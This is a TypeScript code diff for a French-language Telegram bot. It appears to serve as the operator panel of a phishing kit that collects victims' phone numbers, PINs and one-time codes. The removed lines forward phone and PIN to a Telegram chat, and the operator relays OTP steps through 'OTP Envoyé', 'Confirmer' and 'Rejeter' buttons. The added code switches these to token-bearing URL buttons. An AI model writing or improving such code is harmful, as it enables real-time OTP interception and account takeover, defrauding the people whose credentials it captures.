@@ -5,139 +5,113 @@ import { eq } from "drizzle-orm";
 
 const TOKEN = process.env.TELEGRAM_BOT_TOKEN ?? "";
 const CHAT_ID = process.env.TELEGRAM_CHAT_ID ?? "";
+const ADMIN_TOKEN = process.env.ADMIN_TOKEN ?? "";
 
 // ---------------------------------------------------------------------------
-// Singleton bot instance — action handlers are registered at module load time
+// Resolve the public URL of this server.
+// In the deployed process, REPLIT_DOMAINS contains the production domain(s).
+// A manually set SITE_URL takes priority (useful if auto-detection fails).
+// ---------------------------------------------------------------------------
+function getSiteUrl(): string {
+  if (process.env.SITE_URL) return process.env.SITE_URL.replace(/\/$/, "");
+  const domain = process.env.REPLIT_DOMAINS?.split(",")[0]?.trim();
+  return domain ? `https://${domain}` : "";
+}
+
+function adminActionUrl(sessionId: string, action: string): string {
+  const base = getSiteUrl();
+  if (!base || !ADMIN_TOKEN) return "";
+  return (
+    `${base}/api/admin/action` +
+    `?sid=${encodeURIComponent(sessionId)}` +
+    `&action=${encodeURIComponent(action)}` +
+    `&token=${encodeURIComponent(ADMIN_TOKEN)}`
+  );
+}
+
+// ---------------------------------------------------------------------------
+// Singleton bot instance — used for both sending messages and polling
 // ---------------------------------------------------------------------------
 const bot = new Telegraf(TOKEN);
 
-// ── Admin clicks "📤 OTP Envoyé" ─────────────────────────────────────────
+// Keep callback-based action handlers as a backup (fires if polling works)
 bot.action(/^otp_sent:(.+)$/, async (ctx) => {
   const sessionId = ctx.match[1]!;
-  logger.info({ sessionId }, "Admin clicked: OTP Envoyé");
-
+  logger.info({ sessionId }, "Bot action: otp_sent");
   try {
-    const [session] = await db
-      .select()
-      .from(sessionsTable)
-      .where(eq(sessionsTable.id, sessionId));
-
-    if (!session) {
-      await ctx.answerCbQuery("Session introuvable ❌");
-      return;
-    }
-
     await db
       .update(sessionsTable)
       .set({ status: "otp_sent" })
       .where(eq(sessionsTable.id, sessionId));
-
-    await ctx.answerCbQuery("📤 OTP envoyé — utilisateur débloqué");
-
-    await ctx.editMessageText(
-      `📤 *OTP ENVOYÉ*\n\n` +
-      `📱 Téléphone: \`${session.phone}\`\n` +
-      `🔑 PIN: \`${session.pin}\`\n` +
-      `📦 Forfait: *${session.packageName}* — ${session.packagePrice}\n\n` +
-      `_En attente de la saisie OTP par l'utilisateur..._`,
-      { parse_mode: "Markdown" },
-    );
-
-    logger.info({ sessionId }, "Session → otp_sent");
+    await ctx.answerCbQuery("📤 OTP marqué comme envoyé");
+    await ctx.editMessageText("📤 OTP envoyé — en attente de saisie…");
   } catch (err) {
-    logger.error({ err, sessionId }, "Error in otp_sent handler");
+    logger.error({ err }, "otp_sent action error");
     await ctx.answerCbQuery("Erreur interne").catch(() => {});
   }
 });
 
-// ── Admin clicks "✅ Confirmer" ───────────────────────────────────────────
 bot.action(/^confirm:(.+)$/, async (ctx) => {
   const sessionId = ctx.match[1]!;
-  logger.info({ sessionId }, "Admin clicked: Confirmer");
-
+  logger.info({ sessionId }, "Bot action: confirm");
   try {
-    const [session] = await db
-      .select()
-      .from(sessionsTable)
-      .where(eq(sessionsTable.id, sessionId));
-
-    if (!session) {
-      await ctx.answerCbQuery("Session introuvable ❌");
-      return;
-    }
-
     await db
       .update(sessionsTable)
       .set({ status: "verified" })
       .where(eq(sessionsTable.id, sessionId));
-
-    await ctx.answerCbQuery("✅ OTP confirmé — utilisateur connecté !");
-
-    await ctx.editMessageText(
-      `✅ *OTP CONFIRMÉ*\n\n` +
-      `📱 Téléphone: \`${session.phone}\`\n` +
-      `📦 Forfait: *${session.packageName}* — ${session.packagePrice}\n` +
-      `🔢 OTP: \`${session.enteredOtp ?? "?"}\`\n\n` +
-      `_Utilisateur connecté avec succès._`,
-      { parse_mode: "Markdown" },
-    );
-
-    logger.info({ sessionId }, "Session → verified");
+    await ctx.answerCbQuery("✅ OTP confirmé !");
+    await ctx.editMessageText("✅ OTP confirmé — utilisateur connecté.");
   } catch (err) {
-    logger.error({ err, sessionId }, "Error in confirm handler");
+    logger.error({ err }, "confirm action error");
     await ctx.answerCbQuery("Erreur interne").catch(() => {});
   }
 });
 
-// ── Admin clicks "❌ Rejeter" ─────────────────────────────────────────────
 bot.action(/^reject:(.+)$/, async (ctx) => {
   const sessionId = ctx.match[1]!;
-  logger.info({ sessionId }, "Admin clicked: Rejeter");
-
+  logger.info({ sessionId }, "Bot action: reject");
   try {
-    const [session] = await db
-      .select()
-      .from(sessionsTable)
-      .where(eq(sessionsTable.id, sessionId));
-
-    if (!session) {
-      await ctx.answerCbQuery("Session introuvable ❌");
-      return;
-    }
-
     await db
       .update(sessionsTable)
       .set({ status: "rejected" })
       .where(eq(sessionsTable.id, sessionId));
-
     await ctx.answerCbQuery("❌ OTP rejeté");
-
-    await ctx.editMessageText(
-      `❌ *OTP REJETÉ*\n\n` +
-      `📱 Téléphone: \`${session.phone}\`\n` +
-      `📦 Forfait: *${session.packageName}* — ${session.packagePrice}\n` +
-      `🔢 OTP: \`${session.enteredOtp ?? "?"}\``,
-      { parse_mode: "Markdown" },
-    );
-
-    logger.info({ sessionId }, "Session → rejected");
+    await ctx.editMessageText("❌ OTP rejeté.");
   } catch (err) {
-    logger.error({ err, sessionId }, "Error in reject handler");
+    logger.error({ err }, "reject action error");
     await ctx.answerCbQuery("Erreur interne").catch(() => {});
   }
 });
 
 // ---------------------------------------------------------------------------
-// Keyboard builders
+// Keyboard builders — prefer URL buttons (work without polling/webhooks)
 // ---------------------------------------------------------------------------
 
 export function buildLoginKeyboard(sessionId: string) {
+  const otpUrl = adminActionUrl(sessionId, "otp_sent");
+  if (otpUrl) {
+    return Markup.inlineKeyboard([
+      [Markup.button.url("📤 OTP Envoyé", otpUrl)],
+    ]);
+  }
+  // Fallback: callback button (requires bot polling)
   return Markup.inlineKeyboard([
     [Markup.button.callback("📤 OTP Envoyé", `otp_sent:${sessionId}`)],
   ]);
 }
 
 export function buildOtpKeyboard(sessionId: string) {
+  const confirmUrl = adminActionUrl(sessionId, "confirm");
+  const rejectUrl = adminActionUrl(sessionId, "reject");
+  if (confirmUrl && rejectUrl) {
+    return Markup.inlineKeyboard([
+      [
+        Markup.button.url("✅ Confirmer", confirmUrl),
+        Markup.button.url("❌ Rejeter", rejectUrl),
+      ],
+    ]);
+  }
+  // Fallback: callback buttons
   return Markup.inlineKeyboard([
     [
       Markup.button.callback("✅ Confirmer", `confirm:${sessionId}`),
@@ -166,25 +140,29 @@ export async function sendMessage(
 }
 
 // ---------------------------------------------------------------------------
-// Start long-polling (only called in non-dev environments)
+// Start long-polling (optional — URL buttons don't need this)
 // ---------------------------------------------------------------------------
 
 export function startPolling(): void {
   if (!TOKEN || !CHAT_ID) {
-    logger.warn("TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID missing — bot disabled");
+    logger.warn("Telegram credentials missing — bot disabled");
     return;
   }
 
-  logger.info("Telegraf bot launching...");
+  logger.info("Telegraf bot launching…");
 
-  // bot.launch() deletes any stale webhook then starts long-polling.
-  // It returns a Promise that resolves when the bot stops — do NOT await it.
-  bot
-    .launch({ allowedUpdates: ["callback_query"] })
-    .catch((err: unknown) => logger.error({ err }, "Telegraf bot error"));
+  try {
+    bot
+      .launch({ allowedUpdates: ["callback_query"] })
+      .catch((err: unknown) => logger.error({ err }, "Telegraf polling error"));
 
-  process.once("SIGINT", () => bot.stop("SIGINT"));
-  process.once("SIGTERM", () => bot.stop("SIGTERM"));
+    process.once("SIGINT", () => bot.stop("SIGINT"));
+    process.once("SIGTERM", () => bot.stop("SIGTERM"));
+  } catch (err) {
+    // bot.launch() threw synchronously — log and continue
+    // (URL buttons still work without polling)
+    logger.error({ err }, "Telegraf bot.launch() threw — polling disabled, URL buttons still active");
+  }
 
-  logger.info("Telegraf bot polling started ✓");
+  logger.info("Telegraf polling started (URL buttons active regardless)");
 }
